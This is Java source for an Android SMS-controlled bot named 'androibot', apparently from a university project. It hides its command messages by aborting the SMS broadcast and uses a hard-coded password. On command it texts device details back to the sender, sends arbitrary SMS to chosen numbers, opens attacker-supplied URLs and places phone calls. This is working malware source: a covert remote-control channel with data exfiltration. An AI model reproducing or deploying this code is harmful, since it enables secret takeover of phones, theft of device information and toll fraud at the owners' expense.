package xjtu.androibot;

import android.app.PendingIntent;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;
import android.telephony.gsm.SmsManager;
import android.telephony.TelephonyManager;

//import xjtu.sillybot.Network;

public class SMSReceiver extends BroadcastReceiver {

	String CMDPWD = "sillyzily";
    @Override
    public void onReceive(Context context, Intent intent)
    {    	
    	if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    	{
            Bundle bundle = intent.getExtras();
            if(bundle==null)
            {
            	return;
            }
            Object messages[] = (Object[]) bundle.get("pdus");
            SmsMessage smsMessage[] = new SmsMessage[messages.length];
            for (int i = 0; i < messages.length; i++) 
            {
            	smsMessage[i] = SmsMessage.createFromPdu((byte[]) messages[i]);
            	String msg = smsMessage[i].getMessageBody();
            	if(msg.toLowerCase().startsWith("smsbot:"))
            	{
            		HandleCommand(context, smsMessage[i]);
            		abortBroadcast();
            	}
            	
            
            }
    	}
    }
    
    public void HandleCommand(Context context, SmsMessage msg)
    {   
    	String from = msg.getOriginatingAddress();
    	String cmd = msg.getMessageBody().toLowerCase();
    	Toast.makeText(context, "接收来自" + from + "的命令：\n"+cmd, Toast.LENGTH_LONG).show();	
    	
    	String[] strs = cmd.split(":");
    	if(strs.length < 3)
    	{
    		return;
    	}
    	String pwd = strs[1];
    	String command = strs[2];
    	if(pwd.compareToIgnoreCase(CMDPWD) != 0)
    	{
    		return;
    	}
    	
    	//响应命令
    	try
    	{
    		if(command.compareToIgnoreCase("hellobot") == 0)
    		{
    			SmsManager smsManager = SmsManager.getDefault();
    			PendingIntent pintent = PendingIntent.getBroadcast(context, 0, new Intent(), 0);
    			smsManager.sendTextMessage(from, null, "hellomaster", pintent, null);
        	}
    		else if(command.compareToIgnoreCase("info") == 0)
    		{    		
    			String manufact = android.os.Build.MANUFACTURER;
    			String device = android.os.Build.DEVICE;
    			String model = android.os.Build.MODEL;
    			String product = android.os.Build.PRODUCT;
    			String osname = System.getProperty("os.name");
    			String osversion = System.getProperty("os.version");
    			String str = osname+","+osversion+"\n"+manufact + "," + device+","+model+","+product;    		
    		
    			SmsManager smsManager = SmsManager.getDefault();
    			PendingIntent pintent = PendingIntent.getBroadcast(context, 0, new Intent(), 0);
    			smsManager.sendTextMessage(from, null, str, pintent, null);
    		}
    		else if(command.startsWith("sendmsg"))
    		{
    			int index1 = command.indexOf(" ");
    			int index2 = command.indexOf(" ", index1 + 1);
    			String sendto = command.substring(index1 + 1, index2);
    			String text = command.substring(index2 + 1);   	       
    	    
    			SmsManager smsManager = SmsManager.getDefault();
    			PendingIntent pintent = PendingIntent.getBroadcast(context, 0, new Intent(), 0);
    			smsManager.sendTextMessage(sendto, null, text, pintent, null);
    		
    		}    	
    		else if(command.startsWith("openurl"))
    		{    		
    			int index1 = command.indexOf(" ");    			
    			String url = command.substring(index1 + 1);
    			Uri uri = Uri.parse(url);
    			Intent it = new Intent(Intent.ACTION_VIEW, uri);
    			it.setClassName("com.android.browser", "com.android.browser.BrowserActivity");
    			it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    			context.startActivity(it);
    		
    		}
    		else if(command.startsWith("call"))
    		{
    		
    			int index1 = command.indexOf(" ");    			
    			String num = command.substring(index1 + 1);
    			Uri uri = Uri.parse("tel:" + num);    			
    			Intent it = new  Intent(Intent.ACTION_CALL, uri);
    			//it.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
    			it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    			context.startActivity(it); 
    		}    		
    	}
    	catch(Exception e)
    	{
    		SmsManager smsManager = SmsManager.getDefault();
			PendingIntent pintent = PendingIntent.getBroadcast(context, 0, new Intent(), 0);
			smsManager.sendTextMessage(from, null, e.getMessage(), pintent, null);    		
    	}
    	
    	
    }

}